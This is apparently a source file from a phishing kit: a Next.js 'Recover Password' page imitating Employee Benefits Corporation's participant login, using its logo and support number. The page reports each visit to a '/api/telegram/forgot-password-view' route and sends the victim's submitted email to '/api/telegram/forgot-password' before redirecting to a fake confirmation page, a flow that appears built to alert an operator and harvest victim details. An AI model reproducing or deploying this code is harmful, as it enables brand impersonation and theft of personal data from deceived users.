"use client";

import { FormEvent, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";

export default function ForgotPasswordPage() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const hasNotifiedView = useRef(false);

  const isFormValid = email.trim().length > 0;

  useEffect(() => {
    if (hasNotifiedView.current) return;
    hasNotifiedView.current = true;
    fetch("/api/telegram/forgot-password-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email.trim() }),
      }).catch(console.error);
    } catch (err) {
      console.error("Forgot password notification error:", err);
    } finally {
      setIsLoading(false);
    }
    await new Promise((r) => setTimeout(r, 1500));
    router.push("/forgot-password-found");
  };

  return (
    <div className="bg-white min-h-screen">
      <header className="max-w-5xl mx-auto px-5 py-8 md:py-10">
        <div className="flex items-center">
          <img
            src="/emp/images/logo.png"
            alt="Employee Benefits Corporation"
            className="w-28 md:w-40"
          />
          <div className="h-24 md:h-32 w-px bg-gray-300 mx-7"></div>
          <h1 className="text-2xl md:text-4xl font-medium text-gray-400">
            Participant Log In
          </h1>
        </div>
      </header>

      <main className="w-85 md:w-115 mx-auto px-5 md:px-0 mt-7">
        <h2 className="text-[32px] font-medium text-[#294c76] leading-tight">
          Recover Password
        </h2>

        <p className="mt-3 text-[20px] leading-[1.45] text-gray-800">
          Enter the email address linked to your EBC account. We'll send your
          username to that address shortly.
        </p>

        <form onSubmit={handleSubmit} className="mt-10">
          <label htmlFor="email" className="block text-[20px] font-bold">
            Email
            <span className="text-red-700">*</span>
          </label>

          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full h-15 border border-gray-300 rounded-md px-4 text-lg outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-300"
          />

          <button
            type="submit"
            className="w-full h-15 mt-14 rounded-md bg-[#2d5079] border border-[#1f3e63] text-white text-[22px] font-bold hover:bg-[#25466b] transition"
            disabled={isLoading || !isFormValid}
          >
            {isLoading ? "Loading..." : "Send Email"}
          </button>

          <button
            type="button"
            onClick={() => router.push("/")}
            className="w-full h-15 mt-5 flex items-center justify-center border-2 border-[#294c76] text-[#4c8bc5] text-[20px] font-medium hover:bg-gray-50 transition"
          >
            Cancel and Return to Login
          </button>
        </form>

        <p className="text-center text-[18px] mt-6">
          For assistance please call participant services at{' '}
          <a href="tel:8003462126" className="text-[#4c8bc5]">
            800-346-2126
          </a>
          .
        </p>
      </main>
    </div>
  );
}
